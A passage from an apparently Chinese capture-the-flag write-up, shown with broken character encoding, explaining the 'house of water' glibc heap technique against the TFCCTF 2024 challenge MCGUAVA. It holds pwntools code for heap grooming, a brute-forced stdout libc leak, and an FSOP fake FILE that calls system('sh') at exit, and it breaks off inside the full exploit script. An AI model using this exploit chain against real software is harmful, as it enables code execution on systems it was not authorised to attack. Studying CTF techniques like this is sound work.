è¿›è¡Œåˆå¹¶ã€‚å¯èƒ½æœ‰äººä¼šé—®ä¸ºä»€ä¹ˆæˆ‘è¦ç”³è¯·è¿™ä¹ˆå¤§çš„å †å—æ¥é˜²æ­¢åˆå¹¶ï¼Œå…¶å®æˆ‘æ˜¯ä¸ºäº†å‡å°‘å¯¹ tcache çš„å½±å“ï¼Œå› ä¸º house of water åçš„æ”»å‡»å°†ä¼šåœ¨ tcache_perthread_struct ä¸­è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘å°½å¯èƒ½çš„è®©æ›´å°‘çš„ chunk è¿›å…¥ tcacheã€‚è¿™é‡Œè¿›è¡Œäº† fake 0x30 å’Œ unsorted_start 2 ä¸ªå †å—ç´¢å¼•çš„è·å–ï¼Œå¹¶å°† fake 0x30 é‡Šæ”¾æ‰è¿›å…¥ tcache<br>è¿™é‡Œæˆ‘ä»¬å°†ä¸Šé¢ä»£ç è¿›è¡Œä¿®æ”¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br><span class="line">free(<span class="number">15</span>) <span class="comment"># free unsorted_start</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé‡Šæ”¾äº†æˆ‘ä»¬ unsorted_startï¼Œæ­¤æ—¶ bin çš„ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ° 0x30 çš„ tcache å’Œ unsorted bin æŒ‡å‘çš„æ˜¯åŒä¸€å—åŒºåŸŸï¼Œè¯´æ˜æˆ‘ä»¬ä¼ªé€ æˆåŠŸ<br>å¯¹äº unsorted_end ä¸Šæ–¹ fake chunk çš„ä¼ªé€ åŸç†ç›¸åŒï¼Œåªä¸è¿‡è¿™é‡Œçš„ fake chunk å¤§å°ä¸º 0x20ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 17</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 18 fake 0x20</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 19</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 20</span></span><br><span class="line">free(<span class="number">17</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 21</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 22 unsorted_end</span></span><br><span class="line">free(<span class="number">21</span>)</span><br><span class="line">free(<span class="number">22</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x21</span>)) <span class="comment"># 23</span></span><br><span class="line">free(<span class="number">23</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 24</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 25 unsorted_end</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 26</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥éœ€è¦è·å– unsorted_middle è¿™ä¸ªå †å—çš„ç´¢å¼•ï¼Œå› ä¸ºè¿™ä¸ªå †å—ä¸éœ€è¦åœ¨ä¸Šæ–¹ä¼ªé€  fake chunkï¼Œæ‰€ä»¥ç´¢å¼•æ¯”è¾ƒå®¹æ˜“è·å¾—ï¼Œç›´æ¥ç”³è¯·å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 27 unsorted_middle</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 28</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªå †å—åŒæ ·æ˜¯ä¸ºäº†é˜²æ­¢åˆå¹¶<br>åé¢ä¾ç„¶è¿›è¡Œç®€å•çš„æ“ä½œï¼Œåœ¨ tcache_perthread_struct ä¸Šè¿›è¡Œ fake unsorted chunk çš„ä¼ªé€ ï¼Œè¿™éƒ¨ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå·²ç»æˆä¸ºæ¨¡æ¿åŒ–çš„ä¸œè¥¿äº†ï¼Œç”³è¯· 2 ä¸ª size åˆ†åˆ«ä¸º 0x3f0 å’Œ 0x3e0 çš„å †å—ç„¶åç›´æ¥é‡Šæ”¾æ‰å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x3e8</span>) <span class="comment"># 29</span></span><br><span class="line">add(<span class="number">0x3d8</span>) <span class="comment"># 30</span></span><br><span class="line">free(<span class="number">29</span>)</span><br><span class="line">free(<span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><h4 id="è·å–èƒ½å¤Ÿä¿®æ”¹-unsorted-start-å’Œ-unsorted-end-çš„å †å—"><a href="#è·å–èƒ½å¤Ÿä¿®æ”¹-unsorted-start-å’Œ-unsorted-end-çš„å †å—" class="headerlink" title="è·å–èƒ½å¤Ÿä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—"></a>è·å–èƒ½å¤Ÿä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—</h4><p>è¿™ä¸€æ­¥ä¸»è¦æ˜¯å› ä¸ºç¨‹åºæ²¡æœ‰ç¼–è¾‘åŠŸèƒ½ï¼Œå½“æˆ‘ä»¬å°† unsorted_endã€unsorted_middleã€unsorted_start é‡Šæ”¾è¿› unsorted bin æ—¶æˆ‘ä»¬å°±æ— æ³•ä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„æŒ‡é’ˆã€‚<br>è¿™é‡Œæˆ‘è¿˜æ˜¯ä½¿ç”¨å †å—åˆ‡å‰²æ˜¯æ€æƒ³ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x30 å’Œ unsorted_start</span></span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment"># 31</span></span><br><span class="line">add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 32</span></span><br><span class="line">add(<span class="number">0x330</span>) <span class="comment"># 33 change unsorted_start</span></span><br><span class="line">free(<span class="number">33</span>)</span><br><span class="line">add(<span class="number">0x1e0</span>) <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x20 å’Œ unsorted_end</span></span><br><span class="line">free(<span class="number">24</span>)</span><br><span class="line">free(<span class="number">25</span>)</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment"># 35</span></span><br><span class="line">add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 36</span></span><br><span class="line">add(<span class="number">0x340</span>) <span class="comment"># 37 change unsorted_end</span></span><br><span class="line">free(<span class="number">37</span>)</span><br><span class="line">add(<span class="number">0x1d0</span>) <span class="comment"># 38</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äºä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—æˆ‘é€‰æ‹©çš„å¤§å°ä¸º 0x340 å’Œ 0x350ï¼Œå› ä¸ºè¿™ä¸ª 2 ä¸ªå¤§å°çš„å †å—ä¸ªé‡Šæ”¾åæ˜¯ç›´æ¥è¿›å…¥ tcacheï¼Œå¯¹åé¢ unsorted bin ä¸­å­˜å‚¨çš„ unsorted_endã€unsorted_middleã€unsorted_start å½±å“æ¯”è¾ƒå°<br>ä½†ç”±äºè¿™ä¸ªæ“ä½œæ”¹å˜äº†åŸæ¥ unsorted_endã€unsorted_start çš„ sizeä½</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/14.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨æˆ‘ä»¬åˆšè·å–çš„ tcache å †å—æ¥å¯¹ unsorted_endã€unsorted_start çš„ size ä½è¿›è¡Œæ¢å¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x330</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 39</span></span><br><span class="line">free(<span class="number">39</span>) </span><br><span class="line">add(<span class="number">0x340</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 40</span></span><br><span class="line">free(<span class="number">40</span>)</span><br></pre></td></tr></table></figure><h4 id="ä¼ªé€ -fake-unsorted-chunk-çš„prev-size-å’Œ-size"><a href="#ä¼ªé€ -fake-unsorted-chunk-çš„prev-size-å’Œ-size" class="headerlink" title="ä¼ªé€  fake unsorted chunk çš„prev_size å’Œ size"></a>ä¼ªé€  fake unsorted chunk çš„prev_size å’Œ size</h4><p>å› ä¸ºæˆ‘ä»¬çš„ fake unsorted chunk æœ€ç»ˆè¿›å…¥åˆ° unsorted bin ä¸­ï¼Œunsorted bin ä¼šæ£€æµ‹è¿™ä¸ªå †å—çš„åˆæ³•æ€§ï¼Œä¼šæ£€æµ‹ fake unosrted chunk çš„ next chunk çš„prev_size å’Œ sizeï¼Œä¼ªé€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment"># 76</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(<span class="number">0x10000</span>)+p64(<span class="number">0x20</span>)) <span class="comment"># 77</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œ next chunk çš„ issue ä½è¦ä¸º 0ï¼Œå› ä¸º unsorted bin ä¸Šçš„å †å—éƒ½æ˜¯æ²¡æœ‰ç»™ä½¿ç”¨çš„<br>æ¥ä¸‹æ¥å°±æ˜¯æ„‰å¿«çš„ä¸€æ¡é¾™æœåŠ¡ï¼Œä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_start è¿›å…¥ unsorted binï¼Œç„¶ååˆ†åˆ«ä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„ fd å’Œ bk æŒ‡é’ˆå°† fake unsorted chunk é“¾å…¥ unsorted bin ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x238</span>) <span class="comment">#78</span></span><br><span class="line">add(<span class="number">0x248</span>) <span class="comment">#79</span></span><br><span class="line">free(<span class="number">78</span>)</span><br><span class="line">free(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># ä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_start</span></span><br><span class="line">free(<span class="number">25</span>)</span><br><span class="line">free(<span class="number">27</span>)</span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¤ unsorted_start çš„ fd æŒ‡é’ˆå’Œ unsorted_end çš„ bk æŒ‡é’ˆæŒ‡å‘ fake unsorted chunk</span></span><br><span class="line">add(<span class="number">0x330</span>,<span class="number">0x20</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 80</span></span><br><span class="line">free(<span class="number">80</span>)</span><br><span class="line">add(<span class="number">0x340</span>,<span class="number">0x28</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 81</span></span><br><span class="line">free(<span class="number">81</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æå‰ç”³è¯·äº† 2 ä¸ª chunkï¼Œå¤§å°åˆ†åˆ«ä¸º 0x240 å’Œ 0x250ï¼Œè¿™ 2 ä¸ªå †å—åœ¨åç»­çš„æ”»å‡»ä¸­ä¼šç”¨åˆ°ã€‚åœ¨ä¿®æ”¹ fd å’Œ bkæŒ‡é’ˆä¸­æˆ‘ä»¬éœ€è¦çˆ†ç ´åœ°å€çš„ç¬¬ 4 ä½ï¼Œæ¦‚ç‡ä¸º 1&#x2F;16ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çˆ†ç ´çš„æ˜¯ heapbase çš„ç¬¬ 4 ä½ä¸º 0ï¼ŒæˆåŠŸåçš„æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/15.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ° fake unsorted chunk å·²ç»è¿›å…¥åˆ° unsorted bin ä¸­ï¼Œç°åœ¨æˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹ç›®å‰çš„çŠ¶å†µï¼š<br>ç›®å‰ unsorted bin ä¸­æœ‰ 3 ä¸ªå †å—ï¼Œä¸¤ä¾§çš„ unsorted_endã€unsorted_start å¤§å°ä¸º 0x510ï¼Œä¸­é—´çš„ fake unsorted chunk çš„å¤§å°ä¸º 0x10001ï¼Œä¸¤ä¾§çš„å †å—ååˆ†çš„ç¢äº‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶ç”³è¯·å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ fake unsorted chunk å·²ç»è¿›å…¥åˆ° largebin ä¸­ï¼Œå¹¶åœ¨ tcache ä¸Šè¸©ä¸‹ libc çš„åœ°å€</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/16.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ç°åœ¨æˆ‘ä»¬çš„æ€è·¯å°±éå¸¸çš„æ˜ç¡®äº†ï¼Œæˆ‘çš„åšæ³•æ˜¯å…ˆç”³è¯·ä¸€ä¸ª 0x110 å¤§å°çš„å †å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>))</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ largebin çš„ fd æŒ‡é’ˆæ‰€åœ¨çš„ä½ç½®æ­£å¥½æ˜¯ tcache_perthread_struct ä¸Š 0x240 å¤§å° tcache æœ€åä¸€ä¸ª chunk çš„å­˜å‚¨åœ°å€ï¼Œæ­¤æ—¶å·²ç»ç»™è¸©ä¸Šäº† libc çš„åœ°å€</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/17.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ç„¶åå†å°†è¯¥åœ°å€ç”³è¯·å‡ºæ¥ï¼Œå°†åœ°å€çš„ä½ 3 ä½æ”¹ä¸º stdout åœ°å€çš„ä½ 3 ä½ï¼Œçˆ†ç ´ç¬¬ 4 ä½ï¼Œç”¨ tcache åˆ†é…å †å—åˆ° stdout ä¸Šè¿›è€Œæ³„éœ²å‡º libc çš„åœ°å€ï¼Œè¿™é‡Œçš„çˆ†ç ´æˆåŠŸç‡ä¹Ÿä¸º 1&#x2F;16</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) </span><br><span class="line">add(<span class="number">0x230</span>,<span class="number">0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219aa0</span></span><br></pre></td></tr></table></figure><p>è·å– libc åœ°å€åæˆ‘ä»¬å¯ä»¥å§åˆšæ‰ç”³è¯·åœ¨ tcache_perthread_struct ä¸Šçš„å †å—é‡Šæ”¾æ‰å†é‡æ–°ç”³è¯·å›æ¥ï¼Œç„¶ååœ¨ tcache_perthread_struct ä¸Šå­˜å‚¨ 0x250 å¤§å° tcache æœ€åä¸€ä¸ª chunk çš„åœ°æ–¹å†™ä¸Š <em>IO_2_1_stderr</em>  çš„åœ°å€ï¼Œå¹¶ç”³è¯· 0x250 å¤§å°çš„å †å—åœ¨ <em>IO_2_1_stderr</em> ä¸Šå†™ä¸Š fake file</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">86</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x8</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])) </span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">    <span class="number">0x88</span>: libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">    <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable </span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>) </span><br></pre></td></tr></table></figure><p>æœ€åè®©ç¨‹åºé€šè¿‡ exit å‡½æ•°é€€å‡ºå³å¯æ‰§è¡Œæˆ‘ä»¬çš„ fsop æ”»å‡»<br>ä¸‹é¢ç»™å‡ºå®Œæ•´ expï¼Œexp å†™çš„æ¯”è¾ƒä¹±ä¸”æ³¨é‡Šä¸Šå¯¹å †å—çš„æ ‡å·æœ‰ç‚¹ä¸å¤ªå‡†ç¡®ï¼Œè¯·å¸ˆå‚…ä»¬å¤šå¤šåŒ…å®¹ğŸ˜‡</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;*&gt;&#x27;</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index=<span class="number">0</span>,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;how many guavas:&#x27;</span>)</span><br><span class="line">    